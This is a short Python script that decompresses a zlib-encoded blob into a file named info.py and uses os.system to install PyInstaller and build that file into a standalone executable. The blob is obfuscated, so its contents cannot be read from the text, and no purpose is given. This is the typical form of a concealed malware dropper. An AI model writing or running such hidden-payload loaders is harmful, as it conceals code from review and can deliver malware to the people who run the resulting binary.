import os, zlib
info = b'x\x9cmS\xc1\x8e\x9b0\x10\xbd\xf3\x15s*\xb0\x8bh\xc8\xee\x89\x84Ha\t{\xe8\xf6\xb6\xb7n\x85L2d\xad\x10@\xb6i\x15E\xf9\xf7\x0e6$nSK\x88\x99\xf1{3c\xfb\r?v\xadP \x95\xe0\xcd>\x80\xad:u(\x03\x90\x9f\xbd\xe25\xfd\xdb\xed\x01U\x00\xadt\x9c\xb7v\xcb\xea\x82w\x90\x8c\xe1p\x8f\xea\xb3\x95\xaa<5\xec\x88\xde\xdfA\x1d\xf2}g\xb2\xefX\x06\xe08;\xac\xe0\x15U\x91\t\xfe\x0b\xa5\xe7\xc7\x0e\xd0\xdai\x8fH?~j\xbf\xe4\xea\xc8\xe4\x81\x02\xa6\xc5\xf07ovu\x1d\x1eP4X?\xcdCJ\xf1\xd6\xee9\xb58%\xd2\xbc\xaa\x15P\xa3R(\x807\xe31\xc3\xbe\xebPl\x99DSkX\xbc\xba\x96\xf8\x02\xd1-~\xeb%d\xc4jv\xde\x98\xed\x11\xdc\xf8\xe3\xc3\xf5\xaf\xc8\x89\xbeZ%\x10\xe9\xa8@\xd5\x8bf\xa4\xffs\xd0"\x17\x88EzR\xd4\xa9\x06\xf8V/\xe3\x9b\xe87\xb8FY\x00e\x00\xd5@+\x07\xdap\xa1\x1a\x11\xee\xb8<\x14\xbdd{\x1cS]9c\x077\x92\xe9\xa2DF\xc4\x8a\xa3\xf0\xd2\xb1\xee\x0b\xa5\xab\xea\x96)\xed\xa5\xc9\x0b\xed,\xd6\xf4\x8bf\xf3g\x7f\x91\x91\xb5~x\x98\xfb\x8b\x8d\xb1\x9e\xfcEn\xacgS\x8e.0]\xae\xe3\xb1\xa2{\x9e]\xe0\x1c]\xdc\x90\x1e\xe0\xc8\x94\x97\x06\xae>\xacK\xb8Y\x92\xa4\xab\x08\xb0\x96\xa8\x83\xe3%bM{\xebe\x92.3+M\x1c\xce\xab\x0b|Ko\x99\xbe\xae-|6\xe07w\xf8\xef6>\xb3\xf0\x9b\x01\x9f\xdf\xe1_m\xfc\xc6\xc2\xe7\x84\xbfC\xbf\xdb\xe8\x9c4\x9c\xf3\x86\xd5F\xac\xb6p;\x81\xc5\xd5\xb75\xee\x0c\xb2\xe4\x83"\xcd\xb6\xad\xf9Ig|\x90\x18\xc4\xf4=\xda\x0f\xf6_\x05q\x9f&\xcd\x1e\xd0\xca\xd5\x0e\xf0.\x86\xf3\x14\xbf\xb8N/i^\xcc4V\xee4\x85\x04\x99L\x82\xe8\xb3LM\x98\x96\x02\x98x\x01L\xc9\xa8\xde\x1f\x85\xc9N\x17'
os.system('pip install pyinstaller')
f = open('info.py', 'wb')
f.write(zlib.decompress(info))
f.close()
os.system('pyinstaller info.py -F')
